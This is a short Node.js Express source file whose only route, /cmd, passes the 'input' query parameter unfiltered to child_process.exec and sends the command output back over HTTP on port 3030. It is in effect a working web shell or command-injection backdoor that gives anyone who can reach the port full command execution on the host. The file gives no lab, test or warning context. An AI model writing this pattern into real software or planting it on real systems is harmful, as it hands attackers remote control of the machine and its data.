const express = require('express')
const app = express()

app.get('/cmd', (req, res) => {
    const exec = require('child_process').exec
    exec(req.query.input, (err, stdout) => {
        res.send(stdout)
    })
})

app.listen(3030)


